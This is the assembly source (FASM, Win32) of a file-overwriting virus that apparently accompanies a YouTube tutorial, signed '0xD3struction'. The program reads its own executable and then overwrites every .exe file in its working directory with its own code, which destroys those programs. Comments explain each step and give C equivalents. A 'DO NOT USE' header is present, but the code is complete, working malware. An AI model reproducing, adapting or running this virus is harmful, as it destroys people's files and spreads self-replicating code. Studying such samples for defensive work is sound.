;
;     FASM OVERWRITE VIRUS EXAMPLE
;     ( infects only in local directory (*.EXE and *.exe) )
;     FROM VIDEO:
;	   https://www.youtube.com/watch?v=lsSmEvai3jY
;
;     DO NOT USE THIS CODE !
;
;     0xD3struction
;
;    2o23

format PE CONSOLE
entry Virus_Start
include 'win32a.inc'

section '.data' data readable writeable

        intro db '[0xD3struction] (F)ASM VIRUS EXAMPLE',10,10,'[+]Virus Path: %s ',10,10,0
        InfectS db '    [+]< %s >[File Infected!] ',10,0
        InfectF db '    [-]< %s >[Infection Fail!]  ',10,0
        self_ok db '[+] VIRUS READED !',10,10,0
        printf_m db 'VIR[0] = %c',10,0
        printf_z db 'VIR[1] = %c',10,0
        VirusSize dd 0x00001000
        VirusBuffer dd 0x00000000
        VirHand dd 0x00000000
        InfectHandle dd 0x00000000
        BytesReaded dd ?
        BytesWritten dd ?
        WinFindData rb 320
        Path db '*.*',0
        DirHand dd 0x00000000
        ItsEXE db '[+] %s',10,0
        NoExe db '[-] %s ',10,0
        sys_arg db 'pause',0
        logo db                    '     000000000                         DDDDDDDDDDDDD       333333333333333   ',10,\
                                   '   00:::::::::00                       D::::::::::::DDD   3:::::::::::::::33 ',10,\
                                   ' 00:::::::::::::00                     D:::::::::::::::DD 3::::::33333::::::3',10,\
                                   '0:::::::000:::::::0                    DDD:::::DDDDD:::::D3333333     3:::::3',10,\
                                   '0::::::0   0::::::0xxxxxxx      xxxxxxx  D:::::D    D:::::D           3:::::3',10,\
                                   '0:::::0     0:::::0 x:::::x    x:::::x   D:::::D     D:::::D          3:::::3',10,\
                                   '0:::::0     0:::::0  x:::::x  x:::::x    D:::::D     D:::::D  33333333:::::3 ',10,\
                                   '0:::::0 000 0:::::0   x:::::xx:::::x     D:::::D     D:::::D  3:::::::::::3  ',10,\
                                   '0:::::0 000 0:::::0    x::::::::::x      D:::::D     D:::::D  33333333:::::3 ',10,\
                                   '0:::::0     0:::::0     x::::::::x       D:::::D     D:::::D          3:::::3',10,\
                                   '0:::::0     0:::::0     x::::::::x       D:::::D     D:::::D          3:::::3',10,\
                                   '0::::::0   0::::::0    x::::::::::x      D:::::D    D:::::D           3:::::3',10,\
                                   '0:::::::000:::::::0   x:::::xx:::::x   DDD:::::DDDDD:::::D3333333     3:::::3',10,\
                                   ' 00:::::::::::::00   x:::::x  x:::::x  D:::::::::::::::DD 3::::::33333::::::3',10,\
                                   '   00:::::::::00    x:::::x    x:::::x D::::::::::::DDD   3:::::::::::::::33 ',10,\
                                   '     000000000     xxxxxxx      xxxxxxxDDDDDDDDDDDDD       333333333333333   ',10

section '.code' code readable executable


                Infect:
                                                                
                                push ebp                          ; STACK FRAME : for local vars
                                mov ebp,esp                       ;
                                sub esp,0xc                       ; 
                                                                
                                mov [ebp-4],ebx                   ; save file name
                                                                
                                push 0x00                         ;
                                push FILE_ATTRIBUTE_NORMAL        ;
                                push CREATE_ALWAYS                ;
                                push 0x00                         ;
                                push FILE_SHARE_WRITE             ;
                                push GENERIC_WRITE                ;
                                push ebx                          ;
                                call [CreateFileA]                ;
                                                                  ;
                                                                  ;
                                cmp eax,0xFFFFFFFF                ;
                                je InfectFail                     ; [C/ASM] : if(CreateFileA(EBX,GENERIC_WRITE,...) == INVALID_HANDLE_VALUE) goto InfectionFail;
  
                                mov dword [InfectHandle],eax      ;    
                                push 0x00                         ;
                                push dword BytesWritten           ;
                                push dword [VirusSize]            ;
                                push dword [VirusBuffer]          ;
                                push dword [InfectHandle]         ;
                                call [WriteFile]                  ; [C] : WriteFile(InfectHandle,VirusBuffer,VirusSize,&BytesWritten,...)
 
                               

                                mov ecx,dword [BytesWritten]      ; ECX = BytesWritten
                                mov ebx,dword [VirusSize]         ; EBX = VirusSize
                                cmp ecx,ebx                       ; 
                                jne InfectFail                    ; if(ECX!=EBX) goto InfectionFail;
                                                                
                                
                                push dword [ebp-4]                ;
                                push InfectS                      ;
                                call [printf]                     ; [C/ASM] : printf("    [+]< %s >[File Infected!]\n",[ebp-4] );
                                add esp,0x08                      ; 

                                jmp InfectEnd
                                                                  
                    InfectFail:             
                                ;pop ebx
                                push dword [ebp-4]               ;
                                push InfectF                     ;
                                call [printf]                    ; [C/ASM] : printf("    [-]< %s >[Infection Fail!]\n",[ebp-4] );
                                add esp,0x08
                    InfectEnd:
                                                                  
                                push dword [InfectHandle]        ;
                                call [CloseHandle]               ; [C] : CloseHandle(InfectHandle);
                                
                                xor eax,eax                                                             
                                add esp,0x0c
                                pop ebp
                                ret
                                                                

               SelfRead:
                                
                                push 0x00                                               ;/
                                push FILE_ATTRIBUTE_NORMAL                              ;|
                                push OPEN_EXISTING                                      ;|
                                push 0x00                                               ;|
                                push FILE_SHARE_READ                                    ;|
                                push GENERIC_READ                                       ;|
                                push ecx                                                ;|
                                call [CreateFileA]                                      ;|
                                                                                        ;|
                                mov dword [VirHand],eax                                 ;|
                                                                                        ;|
                                test eax,eax                                            ;|
                                je SelfReadEnd                                          ;\[C]: if(!(VirHand=CreateFileEx(*namePtr /*ECX*/,GENERIC_READ,...,FILE_ATTRIBUTE_NORMAL,0))) goto SelfEndFun; [/C]
                                                                
                                push dword [VirusSize]                                  ;/
                                call [malloc]                                           ;|
                                add esp,4                                               ;|
                                                                                        ;|
                                cmp eax,0                                               ;|
                                je SelfReadEnd                                          ;\[C]: if(!malloc(VirusSize)) return 0; [/C]        
                                                                
                                mov dword [VirusBuffer],eax                             ; Saving alocated memmory pointer to VirusBuffer var.
                                                                
                                push 0x00                                               ;/
                                push dword BytesReaded                                  ;|
                                push dword [VirusSize]                                  ;|
                                push eax                                                ;|
                                push dword [VirHand]                                    ;|
                                call [ReadFile]                                         ;|
                                                                                        ;|                
                                cmp eax,0                                               ;|
                                je SelfReadEnd                                          ;\[C]: if(!Readfile(VirHandle,*ptrToMem(EAX),VirusSize,&BytesReaded,0)) goto SelfEndRead; /*return 0;*/;
                                                                
                                mov ecx,dword [BytesReaded]                             ;ECX = BytesReaded
                                mov ebx,dword [VirusSize]                               ;EBX = VirusSize
                                                                
                                cmp ecx,ebx                                                     
                                jne SelfReadEnd                                         ;[C] if(ecx!=ebx) goto SelfReadEnd;
                                                                
                                push dword [VirHand]
                                call [CloseHandle]                                      ;[C] CloseHandle(VirHand)
                                
                                                                
                                xor eax,eax
                                inc eax                                                 ; eax = 1;
                                jmp short SelfReadEnd2
                                                                
               SelfReadEnd:
                                xor eax,eax                                             ; eax = 0;
               SelfReadEnd2:

                              
                                ret                               ; return 0 


Virus_Start:
                push ebp                          ; STACK FRAME : for local vars
                mov ebp,esp                       ;
                sub esp,0xc                       ; 
                                                      
                call [GetCommandLineA]            ;[C] GetCommandLine()
                mov [ebp-4],eax                                   ;saving offset to 


                cmp byte[eax],0x22                ; checking first sign of path, if it is quote mark then virus have to delete it
                jne No_Quote                      ; FOR EG. GetCommandLineA sometimes returns  '"123.EXE"' NOT '123.EXE' (couple months ago returns no quote string,  ;
                  inc eax                         ; thats could be easyli check and fixed) DELETING FIRST ' " ' 

                  push eax                        ; path on stack 
                  call [strlen]                   ; strlen returns:     EAX : string length    ECX : pointer to previous argument(EAX)
                  add esp,4                       ; stack correction  (Windows functions like CreateFileA doing this automaticly)                                                                                                                 ;
                                                  ;                                                                                                                    ;
                  dec eax                         ; String length - 1                                                   
                  add ecx,eax                     ; Seting "cursor" on the last sign                                                                                                                   ;
                  mov byte [ecx],0x00             ; here virus deleating ' " ' from end.  [C] :  VirusPath[Virlen-1]=0x00;                                                                                                                 ;
                  sub ecx,eax                     ;

                  mov [ebp-4],ecx                   ; saving correct path to file
     No_Quote:
                push dword [ebp-4]                ;
                push intro                         ;
                call [printf]                     ; [C] printf("[0xD3struction] \n File Path: %s \n\n",[ebp-4]);
                add esp,8                         
               
                mov ecx,dword[ebp-4]              ; setting argument for SelfRead
                call SelfRead                     ; SelfRead()
                                
                cmp eax,0                         ; [C] : if(!SelfRead()) return 0;
                je EndFun
                                
                                
                push self_ok                  
                call [printf]                     ; printf("[+] VIRUS READED !\n\n");
                add esp,4
                                
                mov dword ebx,[VirusBuffer]               
                push dword [ebx]
                push printf_m
                call [printf]                     ; [C] printf("VIR[0] = %c \n",VirusBuffer[0]);
                add esp,8
                                
                push dword [ebx+1]
                push printf_z
                call [printf]                     ; [C] printf("VIR[0] = %c \n",VirusBuffer[0]);
                add esp,8
                                
               ; push sys_arg
               ; call [system]                     ; [C] system("pause");
               ; add esp,4


                                
                push WinFindData                                   ;
                push Path                                          ;
                call [FindFirstFileA]                              ; [C] FindFirstFile(Path,&WinFindData);
                                
                mov dword [DirHand],eax                            ; saving dir handle
                                
                     FindLoop:
                                
                            push WinFindData                       ;
                            push dword [DirHand]                   ;
                            call [FindNextFileA]                   ;
                                                                   ;
                                                                   ;
                            cmp eax,0                              ; 
                            je EndFun                              ; [C] while(FindNextFile(DirHand,&WinFindData) {
                                
                            lea ebx,[WinFindData+0x2C]             ; [C] EBX = WinFindData.FileName;
                        
                                
                            push ebx                                                   ;
                            call [strlen]                                                  ; 
                            add esp,0x04                           ;
                                                                   ;
                            cmp eax,0x05                           ;
                            jb FindLoop                            ; [C/ASM] : if(strlen(EAX)<0x05) continue;
                                
                            mov ecx,[ebx+eax-0x04]                 ; ECX = last for signs - file extension
                            cmp ecx,0x6578652E                     ; 
                            je Its_exe                             ; [C/ASM] : if(ECX=='exe.') goto Its_exe;
                            cmp ecx,0x4558452E                     ; 
                            je Its_exe                             ; [C/ASM] : if(ECX=='EXE.') goto Its_exe;
                            jmp No_exe                             ; goto No_Exe
                    Its_exe:            
                            push ebx                               ;
                            push ItsEXE                            ;
                            call [printf]                          ; printf("[+] %s \n",EBX);
                            add esp,0x08
                            
                            call Infect                            ;[C] Infect(); /* EBX = FileName */
                            jmp FindLoop                           ;[C] continue;
                                                   
                    No_exe:            
                           push ebx                                ;
                           push NoExe                              ;
                           call [printf]                           ; printf("[-] %s\n",ebx);
                           add esp,8                               
                           jmp FindLoop
               EndFun:

              push logo
              call [printf]
              add esp,0x04

               push sys_arg
               call [system]
               add esp,0x04

               add esp,0xC                       ; correcting stack
               pop ebp

               xor eax,eax
               ret                               ;[C] : return 0;


section '.idata' import data readable writeable

   library kernel,'KERNEL32.DLL',msvcrt,'MSVCRT.DLL'

   import msvcrt,\
                  printf,'printf',\
                  strlen,'strlen',\
                  malloc,'malloc',\
                 system,'system'

   import kernel,\
                  GetCommandLineA, 'GetCommandLineA',\
                  CreateFileA,'CreateFileA',\
                  ReadFile,'ReadFile',\
                  CloseHandle,'CloseHandle',\
                  FindFirstFileA,'FindFirstFileA',\
                  FindNextFileA,'FindNextFileA',\
                  WriteFile,'WriteFile'
